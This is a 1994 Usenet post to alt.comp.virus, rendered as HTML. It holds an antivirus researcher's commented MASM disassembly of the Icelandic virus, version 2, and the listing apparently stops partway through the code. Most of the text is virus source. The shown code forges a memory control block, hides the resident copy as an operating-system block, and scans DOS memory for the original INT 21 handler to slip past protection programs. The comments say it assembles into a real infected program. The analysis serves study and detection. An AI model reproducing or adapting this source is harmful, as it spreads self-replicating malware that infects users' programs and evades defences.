<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ICE2.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">From</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0">!</span><span class="sc5">ix.netcom.com</span><span class="sc0">!</span><span class="sc5">howland.reston.ans.net</span><span class="sc0">!</span><span class="sc5">gatech</span><span class="sc0">!</span><span class="sc5">bloom</span><span class="sc4">-</span><span class="sc5">beacon.mit.edu</span><span class="sc0">!</span><span class="sc5">uhog.mit.edu</span><span class="sc0">!</span><span class="sc5">rutgers</span><span class="sc0">!</span><span class="sc5">engr.orst.edu</span><span class="sc0">!</span><span class="sc5">gaia.ucs.orst.edu</span><span class="sc0">!</span><span class="sc5">myhost.subdomain.domain</span><span class="sc0">!</span><span class="sc5">clair</span><span class="sc0"> </span><span class="sc5">Tue</span><span class="sc0"> </span><span class="sc5">Nov</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">:</span><span class="sc2">54</span><span class="sc4">:</span><span class="sc2">55</span><span class="sc0"> </span><span class="sc2">1994</span><span class="sc0">
</span><span class="sc5">Xref</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0"> </span><span class="sc5">alt.comp.virus</span><span class="sc4">:</span><span class="sc2">489</span><span class="sc0">
</span><span class="sc5">Path</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">netcom.com</span><span class="sc0">!</span><span class="sc5">ix.netcom.com</span><span class="sc0">!</span><span class="sc5">howland.reston.ans.net</span><span class="sc0">!</span><span class="sc5">gatech</span><span class="sc0">!</span><span class="sc5">bloom</span><span class="sc4">-</span><span class="sc5">beacon.mit.edu</span><span class="sc0">!</span><span class="sc5">uhog.mit.edu</span><span class="sc0">!</span><span class="sc5">rutgers</span><span class="sc0">!</span><span class="sc5">engr.orst.edu</span><span class="sc0">!</span><span class="sc5">gaia.ucs.orst.edu</span><span class="sc0">!</span><span class="sc5">myhost.subdomain.domain</span><span class="sc0">!</span><span class="sc5">clair</span><span class="sc0">
</span><span class="sc5">From</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">clair@myhost.subdomain.domain</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Clairvoyant</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Newsgroups</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">alt.comp.virus</span><span class="sc0">
</span><span class="sc5">Subject</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Ice2</span><span class="sc0"> </span><span class="sc5">Disassembly</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc4">-</span><span class="sc5">prot</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0">
</span><span class="sc5">Date</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0"> </span><span class="sc5">Nov</span><span class="sc0"> </span><span class="sc2">1994</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc4">:</span><span class="sc2">26</span><span class="sc0"> </span><span class="sc5">GMT</span><span class="sc0">
</span><span class="sc5">Organization</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">String</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">put</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Organization</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
</span><span class="sc5">Lines</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">493</span><span class="sc0">
</span><span class="sc5">Message</span><span class="sc4">-</span><span class="sc5">ID</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">3bc3kq</span><span class="sc5">$mjc@gaia.ucs.orst.edu</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NNTP</span><span class="sc4">-</span><span class="sc5">Posting</span><span class="sc4">-</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">tempest.rhn.orst.edu</span><span class="sc0">
</span><span class="sc5">X</span><span class="sc4">-</span><span class="sc5">Newsreader</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">TIN</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">version</span><span class="sc0"> </span><span class="sc2">1.2</span><span class="sc0"> </span><span class="sc5">PL2</span><span class="sc4">]</span><span class="sc0">



</span><span class="sc1">;       THE ICELANDIC VIRUS - VERSION 2</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Disassembly done in July '89.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The author(s) of this program is(are) unknown, but it is of</span><span class="sc0">
</span><span class="sc1">;       Icelandic origin. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All comments in this file were added by Fridrik Skulason,</span><span class="sc0">
</span><span class="sc1">;       University of Iceland/Computing Services.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       INTERNET:     frisk@rhi.hi.is </span><span class="sc0">
</span><span class="sc1">;       UUCP:         ...mcvax!hafro!rhi!frisk</span><span class="sc0">
</span><span class="sc1">;       BIX:          FRISK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       To anyone who obtains this file - please be careful with it, I</span><span class="sc0">
</span><span class="sc1">;       would not like to see this virus be distributed too much. The code</span><span class="sc0">
</span><span class="sc1">;       is very clear, and the virus is quite well written. It would be VERY</span><span class="sc0">
</span><span class="sc1">;       easy to modify it to do something really harmful.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus has the following flaws:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               It modifies the date of the program it infects, making</span><span class="sc0">
</span><span class="sc1">;               it easy to spot them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               It removes the Read-only attribute from files, but does</span><span class="sc0">
</span><span class="sc1">;               not restore it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This version appears to do no damage at all. This, and the fact that</span><span class="sc0">
</span><span class="sc1">;       the author(s) sent me a copy probably indicates that it was just</span><span class="sc0">
</span><span class="sc1">;       designed to demonstrate that a virus like this could be written.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This file was created in the following way: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       I disassembled the new version and compared it to my disassembly</span><span class="sc0">
</span><span class="sc1">;       of version #1.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Any changes found were added to this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VIRSIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">128</span><span class="sc0">

        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is a dummy "infected" program, so that this file,</span><span class="sc0">
</span><span class="sc1">;       when assembled (using MASM) will produce a "true" infected</span><span class="sc0">
</span><span class="sc1">;       program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT1</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
</span><span class="sc5">_START</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0b4H</span><span class="sc4">,</span><span class="sc2">09H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STRING</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">STRING</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Hello world!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"$"</span><span class="sc0">
 </span><span class="sc5">_TEXT1</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus is basically divided in two parts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       1. The main program - run when an infected program is run. </span><span class="sc0">
</span><span class="sc1">;          It will check if the system is already infected, and if not</span><span class="sc0">
</span><span class="sc1">;          it will install the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       2. The new INT 21 handler. It will look for EXEC calls, and</span><span class="sc0">
</span><span class="sc1">;          (sometimes) infect the program being run.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is a fake MCB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus starts by pushing the original start address on the stack,</span><span class="sc0">
</span><span class="sc1">;       so it can transfer control there when finished.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LABEL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Put the the original CS on the stack. The ADD AX,data instruction</span><span class="sc0">
</span><span class="sc1">;       is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05H</span><span class="sc0">     
</span><span class="sc5">ORG_CS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0010H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Put the the original IP on the stack. This MOV [BP+2],data instruction</span><span class="sc0">
</span><span class="sc1">;       is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">
</span><span class="sc5">ORG_IP</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Save all registers that are modified.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Check if already installed. Quit if so.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">37FH</span><span class="sc4">],</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0"> 
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Restore all registers and return to the original program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The code to check if INT 13 contains something other than</span><span class="sc0">
</span><span class="sc1">;       0070 or F000 has been removed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set the installation flag, so infected programs run later will</span><span class="sc0">
</span><span class="sc1">;       recognize the infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">37FH</span><span class="sc4">],</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus tries to hide from detection by modifying the memory block it</span><span class="sc0">
</span><span class="sc1">;       uses, so it seems to be a block that belongs to the operating system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       It looks rather weird, but it seems to work. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc0">                  
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                     
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The next line is new - the virus obtains the segment of the</span><span class="sc0">
</span><span class="sc1">;       IBMDOS.COM/MSDOS.SYS program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">DOSSEG</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Back to modification</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">            
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0001</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next, the virus modifies the memory block of the infected program.</span><span class="sc0">
</span><span class="sc1">;       It is made smaller, and no longer the last block.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Then the virus moves itself to the new block. For some reason 2000</span><span class="sc0">
</span><span class="sc1">;       bytes are transferred, when much less would be enough. Maybe the author just</span><span class="sc0">
</span><span class="sc1">;       wanted to leave room for future expansions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus then transfers control to the new copy of itself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">                             
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This part of the program is new. It tries to bypass protection</span><span class="sc0">
</span><span class="sc1">;       programs, by obtaining the original INT 21 address. It searches</span><span class="sc0">
</span><span class="sc1">;       for the byte sequence 2E 3A 26, which (in DOS 3.1 and 3.3) is the</span><span class="sc0">
</span><span class="sc1">;       beginning of the original interrupt (probably also in 3.2 - I do</span><span class="sc0">
</span><span class="sc1">;       not have a copy of that)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">DOSSEG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3000H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3A2EH</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3A</span><span class="sc0">
</span><span class="sc5">L3C</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">L3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       If that fails, it searches for 80 FC 63   (used in 3.0)</span><span class="sc0">
</span><span class="sc1">;                                      80 FC 4B   (used in 2.0)</span><span class="sc0">
</span><span class="sc1">;                                      80 FC F8   (This looks very odd -</span><span class="sc0">
</span><span class="sc1">;       I have no idea what DOS version this might be.)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3000H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FC80H</span><span class="sc0">
</span><span class="sc5">L3D</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3F</span><span class="sc0">
</span><span class="sc5">L3E</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">L3D</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Start of DOS not found - Give up (but remain in memory)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">

</span><span class="sc5">L3A</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">26H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3B</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L3C</span><span class="sc0">
</span><span class="sc5">L3F</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">63H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3B</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4BH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3B</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0F8H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L3B</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L3E</span><span class="sc0">
</span><span class="sc5">L3B</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The main program modifies INT 21 next and finally returns to the</span><span class="sc0">
</span><span class="sc1">;       original program. The original INT 21 vector is stored inside the</span><span class="sc0">
</span><span class="sc1">;       program so a JMP [OLD INT21] instruction can be used.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
